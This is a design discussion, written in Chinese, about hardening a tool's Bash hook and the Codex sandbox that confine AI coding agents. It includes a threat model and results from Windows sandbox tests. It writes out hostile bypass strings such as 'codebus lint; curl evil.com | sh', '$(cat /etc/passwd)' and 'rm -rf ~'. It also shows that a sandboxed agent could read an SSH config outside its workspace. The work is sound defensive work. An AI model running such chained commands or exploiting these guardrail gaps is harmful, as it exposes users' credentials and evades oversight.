# Discussion: Bash hook 拒 shell 元字元 + codex sandbox 對應

**Date:** 2026-05-23
**Mode:** `/spectra-discuss`（討論未進 propose）
**Context:** PR #1 review 後抓到 F4（cli-quality-review）+ D5（spec-drift-audit）兩條未修項；考量 codebus 同時支援 claude code 與 codex、目前 Windows 開發、未來上 macOS/Linux，重新研究後整理。
**Status:** prerequisites 未做完（待 P1+P2 PoC 結果），尚未 `/spectra-propose`。

---

## 1. 背景

### F4（`docs/2026-05-22-cli-quality-review.md`）
`codebus hook check-bash` 的 allow predicate 只用 `split_whitespace` 取前 2-3 token 比 `codebus` basename + `lint` / `quiz validate`，**剩下 token 不檢查**。Claude Code 的 Bash tool 把 `tool_input.command` 字串餵 shell → 同名前綴 + shell chaining 全部漏網：

```
codebus lint --foo && rm -rf ~        ← 漏網
codebus lint; curl evil.com | sh      ← 漏網
codebus lint $(cat /etc/passwd)       ← 漏網
codebus lint`whoami`                  ← 漏網
```

### D5（`docs/2026-05-22-spec-drift-audit.md`）
`openspec/specs/lint-feedback-loop/spec.md` 的 Fix Bash Hook Installation 條款（line 612-675）沒要求拒絕 shell 元字元。**spec 與 code 對齊在「不夠安全」的狀態**。

---

## 2. 研究發現（grounded）

### Claude Code Bash tool 行為
- **Windows**：預設 PowerShell；裝 Git Bash 則走 Git Bash（progressive rollout）
- **macOS / Linux**：bash
- **三個 OS 都把命令字串餵 shell** → metachar 一律會展開
- 結論：**F4 漏洞在三個 OS 都是 real**

### Codex sandbox 行為
- **無 PreToolUse hook 機制** — 不是我們沒接，是 codex CLI 本身就沒這個架構
- **靠 OS-native sandbox**：macOS Seatbelt、Linux Landlock+seccomp、Windows 原生 sandbox（elevated / unelevated）
- **`workspace-write` 預設 NO network access**（要 `[sandbox_workspace_write].network_access = true` 才開）
- 我們的 `--ignore-user-config` 直接 strip user 全域配置 → 使用者無法繞道開 network
- macOS 已知 bug：network_access=true 在 Seatbelt 也被無視 → 永遠關（對我們是 bonus）

### 三個 shell 的危險 metachar 重疊
- POSIX（bash、Git Bash）：`;` `&` `|` `$` backtick `>` `<` `(` `)` newline
- PowerShell：同上 + 字串內 `$()` `@()`
- **黑名單 `; & | $ \` > < ( ) \n \r` 同時覆蓋三個 shell**，不需平台特化

### codebus 既有架構觀察
- `SpawnSpec.command_allowance: Option<CommandPrefix>` 已是 provider-neutral 概念
- Claude backend → `--allowedTools Bash(<prefix> *)` ✓
- **Codex backend → `eprintln warning` + 忽略**（`codex_backend.rs:176-182`）— 既有架構承認的 gap

---

## 3. 威脅模型（六種，按 OS sandbox 覆蓋程度）

| # | 威脅 | Claude path（修 F4 後） | Codex path（現狀） |
|---|---|---|---|
| A | workspace 自殘（`rm wiki/*`） | Hook 擋 codebus 以外 → 阻斷 | **允許** — workspace-write 合法。靠 git auto-commit recovery |
| B | 外部 RCE / 網路 exfil | Hook 擋 + F4 修完整 | OS sandbox 阻 network + `--ignore-user-config` |
| C | 讀使用者敏感檔（`~/.ssh/id_rsa`） | **半開** — `check-read` 只擋 image，Read 工具可讀任意檔 | **OS sandbox 阻** workspace 外 read（**待 P1 驗 Windows**） |
| D | 跑長存 process | Hook 限定 codebus → 短命 | codex agent 結束時 sandbox cleanup |
| E | 跑非 codebus binary（git、curl、自編 exe） | Hook 擋 argv[0] | **無 gating** — workspace 內可跑任何 binary（受 no-network + 寫範圍限制） |
| F | 資源耗盡 / fork bomb | Hook 擋 Bash | codex turn timeout 應中斷（**未驗**） |

**架構不對稱**：
- Claude path 弱在 **C**（Read 工具 PII / 路徑橫越未防）
- Codex path 弱在 **E**（workspace 內 binary 自由跑）
- 兩邊各自有對方擋得很好的弱點

---

## 4. F4 修法（claude path）

### 4.1 修法位置
`codebus-cli/src/commands/hook.rs` 的 `is_allowed_bash_command`（line 128-130）。在現有兩個白名單比對前，先檢查 raw `cmd` 字串含任一危險字元就 return false → 走 block path。

### 4.2 黑名單
`;` `&` `|` `$` backtick `>` `<` `(` `)` `\n` `\r`

**不檢測引號** — 簡單性 > 完整性，agent 沒 use case 需引號內 metachar。

### 4.3 Spec 改動
`openspec/specs/lint-feedback-loop/spec.md` 的 Fix Bash Hook Installation 段（line 618-624）：
- Allow 條款加 precondition「AND the command string contains none of the shell metacharacters `; & | $ \` > < ( ) newline CR`」
- Block 條款加對應「OR the command string contains any of the above」
- 新增 3 個 Scenario：`codebus lint && rm -rf /` block、`codebus lint; curl evil.com` block、`codebus lint $(whoami)` block

不另開 requirement — 既有段落已是 hook 子命令契約，加在原地最聚焦。

### 4.4 Provider 中性 wording
Spec 寫的是 `codebus hook check-bash` 子命令契約（與 caller 無關）；實作上 codex 本來就不走 hook，所以這條 spec 變更**只對 claude path 生效**。Spec 不需要點名 claude。

---

## 5. Codex 殘留風險（威脅 E）— 6 個選項

| # | 方案 | 工程量 | 真實 enforcement? | 跨 OS |
|---|---|---|---|---|
| 1 | **不做** — 信任 codex 模型 + git auto-commit recovery | 0 | 否 | n/a |
| 2 | **AGENTS.md soft constraint** — 文字寫「only invoke `codebus lint` / `quiz validate`」 | 30 min | 否（提示等級） | ✓ |
| 3 | **`-c shell_environment_policy` 鎖 PATH** — codex 子 shell PATH 只含 codebus 目錄 | 半天 + 跨 OS 驗 | 是（環境級） | 需驗 |
| 4 | **後置 git diff 警告** — 跑完 codex 比 `.codebus/wiki` diff，出現預期外檔案就 alert | 半天 | 否（檢測） | ✓ free |
| 5 | **codex `writable_roots` 細部設定** — 只允許寫 `wiki/`，不允許寫 `raw/`、`.claude/` | 半天 + 驗 | 是（OS sandbox） | 三 OS 各自支援度需驗 |
| 6 | **wrapper + process watcher** — 自己 fork watcher 監視 codex 子 process tree | 重（2-3 天）+ 跨 OS 難 | 是 | 困難 |

### 暫定優先序

**立刻做（包進 F4 同個 change 或下一個小 change）**：
- (2) AGENTS.md soft constraint：30 min，零風險
- (5) `writable_roots` 縮 wiki/：ROI 最高，real enforcement + 語意正確（fix 本來就不該動 raw/`.claude/`）— **待 P2 驗可行性**

**研究後決定**：
- (3) PATH 鎖：低成本 real enforcement，但 codex 文件薄

**長期 / 看真實 incident 再做**：
- (4) 後置 diff 警告：detection 而非 prevention
- (1) 接受現狀：solo dev、有 git rollback、無外部 user

**不做**：
- (6) wrapper + watcher：複雜度遠超 codex path 真實威脅

---

## 6. 策略觀察

修完 F4 後，**整體系統的「最脆弱點」反而從 claude path 轉到 codex path 的 (E)**。Claude 一直是白名單嚴、codex 一直是 OS 沙箱寬。對稱化是一個 architectural choice，不是必須：

- **要對稱化** → 走 (2)+(5)+(3)，讓 codex 也接近「只能跑 codebus」白名單
- **接受不對稱** → 兩個 provider 用各自最自然的防線，文檔說清楚 codex path 的工作模型是「sandbox 圍欄 + agent 自律」

Solo dev 階段傾向**接受不對稱 + 做 (2) + 做 (5)**。

---

## 7. Prerequisites（必須在 propose 之前完成）

### P1：Windows codex sandbox baseline 驗證
驗 `workspace-write` 預設行為。預期：

| 動作 | 預期結果 |
|---|---|
| 1. 讀 `%USERPROFILE%\.ssh\id_rsa`（workspace 外 read） | deny 或 allow（**未知**，docs 沒明說 read 範圍） |
| 2. `Invoke-WebRequest https://example.com`（network） | deny（network_access 預設 false） |
| 3. 寫 `C:\Windows\Temp\codebus-test.txt`（workspace 外 write） | deny |
| 4. 寫 `.\codebus-poc-allowed.txt`（workspace 內 write） | allow |

**重要性**：4 條都符合 → Windows sandbox 真有效 → 可以選「接受不對稱（只做 soft constraint）」
1-3 任一沒 deny → Windows sandbox 有洞 → **必須**走 writable_roots + 補強

### P2：codex `writable_roots` 細粒度驗證
驗 `[sandbox_workspace_write].writable_roots` 可不可以限定子目錄：

```
codex exec --sandbox workspace-write \
  -c sandbox_workspace_write.writable_roots='["wiki"]' \
  ...
```

agent 嘗試：
- 寫 `wiki/poc.txt` → 預期 allow
- 寫 `raw/poc.txt` → 預期 deny

**重要性**：work → (5) writable_roots 可行，併進 F4 change
不 work / 不支援陣列 → (5) 降級或換方案

---

## 8. PoC 測試結果（2026-05-23 實機 Windows / codex 0.133.0）

### Setup
- 機器：Windows 11、Codex 0.133.0、ChatGPT login（無 Trusted-Access-for-Cyber 權限）
- workspace：`C:\Users\harry\AppData\Local\Temp\codex-poc-p1`（空目錄）
- 旗標：`--sandbox workspace-write --skip-git-repo-check --ephemeral --ignore-user-config --disable apps --ignore-rules`（與 `codex_backend.rs:90-97` 完全對齊）

### P1 — workspace-write 行為實測

| # | 動作 | 預期 | 實測 | 備註 |
|---|---|---|---|---|
| 1 | 讀 `C:/Users/harry/.ssh/config`（workspace 外 read） | 未知 | ✅ **SUCCEEDED**（讀到 SSH config 內容） | **威脅 C 是 real** |
| 2 | `curl -sI https://example.com`（network） | deny | `rejected: blocked by policy` | network 預設關 ✓ |
| 3 | `Set-Content C:/Windows/Temp/codex-poc-outside.txt`（workspace 外 write） | deny | `rejected: blocked by policy` | ✓ |
| 4 | `Set-Content ./codex-poc-inside.txt`（workspace 內 write 經 shell） | allow | `rejected: blocked by policy` | **意外** — 詳見下方 |

### P1 重大發現

**(a) Codex `workspace-write` 設計上就允許讀 workspace 外任意檔**
- 官方 docs（[Sandbox – Codex](https://developers.openai.com/codex/concepts/sandboxing)）：「workspace-write mode ... maintains read access more broadly」
- 實測：agent 用 `Get-Content C:/Users/harry/.ssh/config` 直接讀出 SSH config 內容、無任何阻擋
- **威脅 C 在 codex path 是 real**（原 §3 表格錯誤校正）：agent 可讀 `~/.ssh/`、`~/.aws/credentials`、user 任何明文 secret 檔

**(b) Codex 對 shell 寫入有內建 execpolicy 防線，即使在 workspace 內**
- 我們已 `--ignore-rules` 卻仍被 block — 表示 codex 有**內建 deny-by-default execpolicy**，user/project `.rules` 之外還有一層 built-in 安全網
- shell 路徑（`Set-Content`、`curl`）= deny；正常 file 編輯走 `apply_patch` tool（codex 內建，繞過 execpolicy，受 sandbox 寫範圍限制）
- 真實 codebus fix 能 work 是因為 codex 用 `apply_patch` 改 wiki/，不是 shell `Set-Content`
- **意義**：威脅 E（agent 跑非 codebus binary）在 codex path **被內建 execpolicy 大幅縮窄**——不是完全擋，但比預期嚴。原 §3 表格「無 gating」過度悲觀

**(c) Network 預設關死（confirmed）**
- 即使 sandbox=workspace-write 也 deny。`--ignore-user-config` 進一步保證 user 無法繞道開
- 威脅 B 完全覆蓋 ✓

**(d) Agent 自己提示「The environment is read-only」**
- codex 似乎把 sandbox 狀態暴露給 model 當 system context；model 主動避免寫入
- 是 soft hint，不是 hard enforcement，但有額外行為防線

### P2 — `writable_roots` 細粒度（跳過實測，docs/issue 已答）

[GitHub issue #23552](https://github.com/openai/codex/issues/23552)：**Windows 上 `writable_roots` 列入的目錄仍會 prompt for approval** — bug。
[GitHub issue #18558](https://github.com/openai/codex/issues/18558)：Windows `[windows].sandbox = "elevated"` + workspace-write 會允許 write 到 workspace 外 — 嚴重 bug。

→ **Windows 的 `writable_roots` 不可靠**。原 §5 選項 (5) 在 Windows path 上**降到 nice-to-have**，不能當實質 enforcement。Mac/Linux 上推測 work（per 設計意圖），但 Windows 是當前主開發環境。

---

## 8.5 PoC 後 — 威脅模型校正

| # | 威脅 | Claude path（修 F4 後） | Codex path（**校正後**） |
|---|---|---|---|
| A | workspace 自殘 | Hook 擋 | shell write 被 execpolicy 擋；apply_patch 仍可寫 workspace 內檔 → 部分擋（**改善**） |
| B | 外部 RCE / 網路 exfil | Hook 擋 | OS sandbox 阻 network（confirmed） |
| C | 讀使用者敏感檔 | 半開（Read tool） | **❗ 開**（confirmed: SSH config 可讀） |
| D | 跑長存 process | Hook 擋 | execpolicy 擋（推測，從 (b) 推論） |
| E | 跑非 codebus binary | Hook 擋 | **execpolicy 預設擋大部分**（**校正**，原表「無 gating」太悲觀） |
| F | 資源耗盡 | Hook 擋 | execpolicy + sandbox |

**最新弱點分布**：
- Claude path 弱在 **C**（Read 工具讀任意檔）
- **Codex path 弱在 C**（confirmed，比 Claude 還明顯——shell `Get-Content` 直接讀出 SSH config）

→ **兩個 provider 同弱在 C**。威脅 C 從「另開 backlog」升級為**值得跟 F4 同期處理的核心問題**。

---

## 8.6 PoC 後 — 選項重新評估

| # | 方案 | PoC 後評估 |
|---|---|---|
| 1 | 不做（接受現狀） | **不再可選** — 威脅 C 已 confirmed real，零 prevention |
| 2 | AGENTS.md soft constraint | 依然有價值（零成本）；指引 agent 不主動讀 `~/.ssh` 等 |
| 3 | `shell_environment_policy` 鎖 PATH | 對 C 沒幫助（讀檔不靠 PATH）；對 E 有點用但 execpolicy 已擋 |
| 4 | 後置 git diff 警告 | 對 C 沒幫助（讀不留痕）；對 A 有用 |
| 5 | `writable_roots` 縮 wiki/ | Windows 不可靠（issue #23552、#18558）；Mac/Linux 應 work；對 C 完全沒幫助 |
| 6 | wrapper + process watcher | 對 C 仍無解（read 不需要 spawn child） |

**新發現的選項**：

| # | 方案 | 對 C 的覆蓋 |
|---|---|---|
| 7 | **OS-level wrapper：在 codex spawn 前修改 ACL / chmod 把 `~/.ssh`、`~/.aws` 等改成 owner-execute（沒讀權限）** | 真擋，但跨 OS 實作貴、會干擾 user 其他工具、Windows ACL 機制不同 |
| 8 | **Container / sandbox-of-sandbox**：把 codex 整個丟進 docker/job-object/seatbelt-profile，外加一層 read 限制 | 真擋；對 codebus 是大改造（codebus 自己變成 sandbox host） |
| 9 | **接受 C 風險 + 用記憶體型 / per-vault 隔離環境變數**：codex spawn 前 unset 敏感 env，但檔案系統還是讀得到 | 部分；對 env-based secret（如 `ANTHROPIC_API_KEY`）有用，對檔案 secret 無用 |

---

## 9. 不在本討論範圍（另開 backlog）— **校正**

~~威脅 C 另開 backlog~~ → **威脅 C 升級為 F4/D5 同期決議項**：
- Claude path：擴 `check-read` hook 加敏感路徑黑名單（`~/.ssh/`、`~/.aws/`、`~/.gnupg/`、`*.pem`、`*.key`、`*id_rsa*` 等）
- Codex path：因為沒 hook，**選項 7-9 都複雜**。短期靠 (2) soft constraint + 文檔警告；長期看是否要 sandbox-of-sandbox

---

## 10. 下一步（PoC 後更新）

PoC 改變了 scope。**不再是「小修 F4」**，變成「F4 + 威脅 C 對應」的更大決策。

**討論面向**（待 harry 收口）：
1. **F4 本身**（claude path Bash hook 補 metachar）— scope 清楚，可直接 propose。
2. **威脅 C — claude path** — 擴 `check-read` 路徑黑名單。是 latent 安全 issue 但**機制簡單**（既有 hook 加 list 即可）。
3. **威脅 C — codex path** — 沒便宜解。要不要接受、軟性處理（AGENTS.md 警告 + 文檔講明）、還是投資架構級隔離？
4. **scope 切分**：
   - Plan A：F4 + 威脅 C claude 同一 change（兩個 hook 加防線）；codex C 另開 backlog（明文降級到「文檔警告」）
   - Plan B：F4 單獨；威脅 C（兩 provider）合成另一 change
   - Plan C：三件事一個 change（重，但故事完整）

我傾向 **Plan A**：claude path 兩個 hook 同期加強（mechanism 對稱），codex path C 因為**沒便宜解**先以 AGENTS.md + 文檔降級處理 + 開 backlog 追蹤長期方案。
